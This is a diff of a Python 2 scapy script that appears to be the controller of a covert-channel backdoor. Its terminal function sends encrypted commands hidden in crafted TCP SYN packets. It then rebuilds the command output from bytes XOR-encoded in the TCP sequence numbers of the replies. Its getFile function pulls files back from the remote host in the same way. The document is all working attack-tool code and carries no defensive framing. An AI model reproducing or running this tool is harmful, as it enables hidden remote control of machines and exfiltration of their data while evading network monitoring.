@@ -342,9 +342,9 @@ def getFile(address, port, gFile):
 			dPacket = sniff(filter="tcp sport " + str(port) + " and ip src " + address, count=1, timeout=30)
 			if len(dPacket) == 0:
 				break
-			tFile.write(dPacket[RAW].load)
 			if "F" in dPacket[0][TCP].flags:
 				break
+			tFile.write(dPacket[RAW].load)
 '''
 ---------------------------------------------------------------------------------------------
 -- 
@@ -368,16 +368,24 @@ def getFile(address, port, gFile):
 ---------------------------------------------------------------------------------------------
 '''
 def terminal(address, port, command):
-	print "Do stuff"
+	result = ""
 	commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
 	                TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215), flags="S")/\
 	                RAW(load=encrypt(command))
 	send(commandPacket, verose=0)
-	packets = sniff(count=1, filter="tcp src port " + str(port) + " and ip src " + address, timeout=30)
-	if len(packets) == 0:
-		print "Timeout. reply not received."
-	else:
-		print encrypt(packets[0][RAW].load)
+	
+	while True:
+		dPacket = sniff(filter="tcp sport " + str(port) + " and ip src " + address, count=1, timeout=30)
+		if len(dPacket) == 0:
+			break
+		if "F" in dPacket[0][TCP].flags:
+			break
+		result = result + chr(0x000000FF^(dPacket[0][TCP].seq>>24))
+		result = result + chr(0x000000FF^(dPacket[0][TCP].seq>>16))
+		result = result + chr(0x000000FF^(dPacket[0][TCP].seq>>8))
+		result = result + chr(0x000000FF^(dPacket[0][TCP].seq))
+	
+	print encrypt(result)
 
 '''
 ---------------------------------------------------------------------------------------------
